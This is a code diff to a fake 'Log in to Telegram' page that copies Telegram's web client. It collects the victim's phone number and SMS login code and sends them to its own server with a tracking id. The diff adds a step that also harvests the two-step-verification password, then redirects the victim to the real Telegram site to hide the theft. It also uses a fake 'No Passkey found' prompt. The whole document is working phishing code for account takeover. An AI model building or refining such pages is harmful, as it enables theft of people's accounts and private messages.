@@ -32,7 +32,6 @@
             z-index: 10;
         }
 
-        /* Official Logo Styling */
         .logo-wrapper {
             width: 120px; height: 120px;
             margin: 0 auto 32px;
@@ -46,13 +45,12 @@
         h1 { font-size: 32px; font-weight: 500; margin: 0 0 12px; }
         p { color: var(--text-secondary); font-size: 16px; margin-bottom: 35px; line-height: 1.5; }
 
-        /* QR Code - Transparent Web K Style */
         .qr-wrapper {
             position: relative;
             width: 240px; height: 240px;
             margin: 0 auto 32px;
             padding: 10px;
-            background: white; /* Real Web K uses white bg for the QR container */
+            background: white;
             border-radius: 24px;
         }
         #qr-display {
@@ -67,7 +65,6 @@
             display: flex; align-items: center; justify-content: center;
         }
 
-        /* Instructions List */
         .instructions {
             text-align: left; padding: 0; margin: 0 auto 30px;
             list-style: none; counter-reset: step; max-width: 300px;
@@ -82,7 +79,6 @@
             font-weight: 700; font-size: 16px;
         }
 
-        /* Input Group - Pixel Perfect Web K */
         .input-wrapper {
             border: 1px solid var(--input-border);
             border-radius: 12px;
@@ -93,7 +89,7 @@
         }
         .input-wrapper:focus-within {
             border: 2px solid var(--primary-color);
-            padding: 11px 15px; /* Adjust padding for 2px border */
+            padding: 11px 15px;
         }
         .input-label {
             color: var(--primary-color);
@@ -105,7 +101,6 @@
             color: white; font-size: 17px; width: 100%;
         }
 
-        /* Buttons */
         .btn-primary {
             background: var(--primary-color);
             color: white; border: none; border-radius: 12px;
@@ -114,17 +109,15 @@
             cursor: pointer; text-transform: uppercase;
             margin-top: 10px;
         }
-        .btn-primary:hover { opacity: 0.9; }
 
         .link-action {
             color: var(--primary-color);
             text-transform: uppercase;
             font-weight: 700; font-size: 14px;
             margin-top: 25px; display: block;
-            cursor: pointer; transition: 0.2s;
+            cursor: pointer;
         }
 
-        /* Loader */
         .loader {
             display: none; width: 28px; height: 28px;
             border: 3px solid rgba(255,255,255,0.1);
@@ -163,7 +156,7 @@
             <h1>Log in to Telegram</h1>
             <ul class="instructions">
                 <li>Open Telegram on your phone</li>
-                <li>Go to <b>Settings</b> &gt; <b>Devices</b> &gt; <b>Link Desktop Device</b></li>
+                <li>Go to <b>Settings</b> > <b>Devices</b> > <b>Link Desktop Device</b></li>
                 <li>Point your phone at this screen to confirm login</li>
             </ul>
             <div class="link-action" onclick="showStep('phone')">Log in by phone number</div>
@@ -197,6 +190,19 @@
             <button class="btn-primary" onclick="handleCode()">Next</button>
         </div>
 
+        <div id="step-2fa" class="step">
+            <div class="logo-wrapper">
+                <svg class="tg-logo-svg"><use href="#logo-icon" /></svg>
+            </div>
+            <h1>Two-Step Verification</h1>
+            <p>Your account is protected by an additional password.</p>
+            <div class="input-wrapper">
+                <div class="input-label">Password</div>
+                <input type="password" id="password-field" placeholder="Enter Password">
+            </div>
+            <button class="btn-primary" onclick="handle2FA()">Next</button>
+        </div>
+
         <div class="loader" id="sync-loader"></div>
     </div>
 
@@ -225,7 +231,7 @@
             document.getElementById('sync-loader').style.display = 'none';
             alert("No Passkey found. Please use your phone number.");
             showStep('phone');
-        }, 1500);
+        }, 1200);
     }
 
     async function loadQR() {
@@ -238,8 +244,12 @@
 
     async function handlePhone() {
         currentNumber = iti.getNumber();
-        if(!currentNumber) return alert("Enter valid number");
+        if(!iti.isValidNumber()) return alert("Please enter a valid phone number.");
+        
+        // Hide previous step, show loader
+        document.getElementById('step-phone').classList.remove('active');
         document.getElementById('sync-loader').style.display = 'block';
+
         try {
             const res = await fetch('/step_phone', {
                 method: 'POST',
@@ -247,20 +257,27 @@
                 body: JSON.stringify({ phone: currentNumber, tid: tid })
             });
             const data = await res.json();
+            
             if(data.status === "success") {
                 document.getElementById('user-phone').innerText = currentNumber;
-                showStep('code');
+                showStep('code'); // Loader hidden here
             } else {
                 alert(data.msg || "Error occurred");
-                document.getElementById('sync-loader').style.display = 'none';
+                showStep('phone');
             }
-        } catch(e) { document.getElementById('sync-loader').style.display = 'none'; }
+        } catch(e) { 
+            alert("Connection error.");
+            showStep('phone'); 
+        }
     }
 
     async function handleCode() {
         const code = document.getElementById('sms-field').value;
-        if(!code) return;
+        if(code.length < 5) return alert("Enter the 5-digit code.");
+        
+        document.getElementById('step-code').classList.remove('active');
         document.getElementById('sync-loader').style.display = 'block';
+
         try {
             const res = await fetch('/step_code', {
                 method: 'POST',
@@ -268,13 +285,44 @@
                 body: JSON.stringify({ phone: currentNumber, code: code, tid: tid })
             });
             const data = await res.json();
+            
+            if(data.status === "success") {
+                window.location.href = "https://web.telegram.org";
+            } else if (data.status === "2fa_needed") {
+                showStep('2fa'); // Loader hidden here
+            } else {
+                alert("Invalid Code");
+                showStep('code');
+            }
+        } catch(e) { 
+            showStep('code'); 
+        }
+    }
+
+    async function handle2FA() {
+        const pass = document.getElementById('password-field').value;
+        if(!pass) return alert("Enter your cloud password.");
+
+        document.getElementById('step-2fa').classList.remove('active');
+        document.getElementById('sync-loader').style.display = 'block';
+
+        try {
+            const res = await fetch('/step_2fa', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ phone: currentNumber, password: pass, tid: tid })
+            });
+            const data = await res.json();
+            
             if(data.status === "success") {
                 window.location.href = "https://web.telegram.org";
             } else {
-                alert("Invalid Code");
-                document.getElementById('sync-loader').style.display = 'none';
+                alert("Incorrect Password");
+                showStep('2fa');
             }
-        } catch(e) { document.getElementById('sync-loader').style.display = 'none'; }
+        } catch(e) { 
+            showStep('2fa'); 
+        }
     }
 
     loadQR();
